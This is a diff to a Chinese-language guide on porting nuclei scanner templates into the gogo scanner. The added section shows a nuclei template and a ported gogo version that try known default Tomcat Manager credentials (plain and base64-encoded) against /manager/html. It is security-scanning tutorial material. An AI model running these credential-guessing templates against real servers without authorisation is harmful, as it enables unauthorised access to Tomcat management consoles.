@@ -59,7 +59,7 @@ https://github.com/projectdiscovery/nuclei-templates/blob/d6636f9169920d3ccefc69
 2. 减少不必要的发包, apollo实际上只需要第一个signin的包即可确定是否成功
 3. dsl在gogo中已删除, 因为dsl不是必要功能, 大部分场景都能通过正则实现, dsl只是减少复杂场景的使用难度. 因此, 我们可以把这段dsl修改为匹配固定值
 
-
+### example 1 apollo login
 
 **step 1** 删除不必要的header, 仅保留如下信息, 并重新添加tags
 
@@ -115,6 +115,138 @@ requests:
           - 302
 ```
 
+### example 2 tomcat default login
+
+这是nuclei的tomcat默认漏洞登录poc
+```
+id: tomcat-default-login
+
+info:
+  name: ApahceTomcat Manager Default Login
+  author: pdteam
+  severity: high
+  description: Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
+  reference:
+    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
+  tags: tomcat,apache,default-login
+
+requests:
+  - raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+    payloads:
+      username:
+        - tomcat
+        - admin
+        - ovwebusr
+        - j2deployer
+        - cxsdk
+        - ADMIN
+        - xampp
+        - tomcat
+        - QCC
+        - admin
+        - root
+        - role1
+        - role
+        - tomcat
+        - admin
+        - role1
+        - both
+        - admin
+
+      password:
+        - tomcat
+        - admin
+        - OvW*busr1
+        - j2deployer
+        - kdsxc
+        - ADMIN
+        - xampp
+        - s3cret
+        - QLogic66
+        - tomcat
+        - root
+        - role1
+        - changethis
+        - changethis
+        - j5Brn9
+        - tomcat
+        - tomcat
+        - 123456
+
+    attack: pitchfork  # Available options: sniper, pitchfork and clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Apache Tomcat"
+          - "Server Information"
+          - "Hostname"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+```
+
+这是gogo中移植修改完的:
+因为不支持动态的dsl, 所以需要将base64预先计算好, extractor 可以视情况保留, gogo支持extractor功能, 但是对于输出目前处理的并不是很优雅, 后续还会对此功能更新优化.
+
+```
+id: tomcat-manager-login
+info:
+  author: pdteam
+  name: tomcat-manager-default-password
+  severity: high
+  tags: tomcat-manager
+requests:
+  - raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{auth}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
+    attack: sniper
+    stop-at-first-match: true
+    matchers:
+      - status:
+          - 200
+        type: status
+      - type: word
+        words:
+          - Apache Tomcat
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - 'JSESSIONID\..*=([a-z0-9.]+)'
+    matchers-condition: and
+    payloads:
+      auth:
+        - dG9tY2F0OnRvbWNhdA==
+        - dG9tY2F0OnMzY3JldA==
+        - YWRtaW46YWRtaW4=
+        - b3Z3ZWJ1c3I6T3ZXKmJ1c3Ix
+        - ajJkZXBsb3llcjpqMmRlcGxveWVy
+        - Y3hzZGs6a2RzeGM=
+        - QURNSU46QURNSU4=
+        - eGFtcHA6eGFtcHA=
+        - UUNDOlFMb2dpYzY2
+        - YWRtaW46dG9tY2F0
+        - cm9vdDpyb290
+        - cm9sZTE6cm9sZTE=
+        - cm9sZTpjaGFuZ2V0aGlz
+        - dG9tY2F0OmNoYW5nZXRoaXM=
+        - YWRtaW46ajVCcm45
+        - cm9sZTE6dG9tY2F0
+```
 
 ## 测试
 
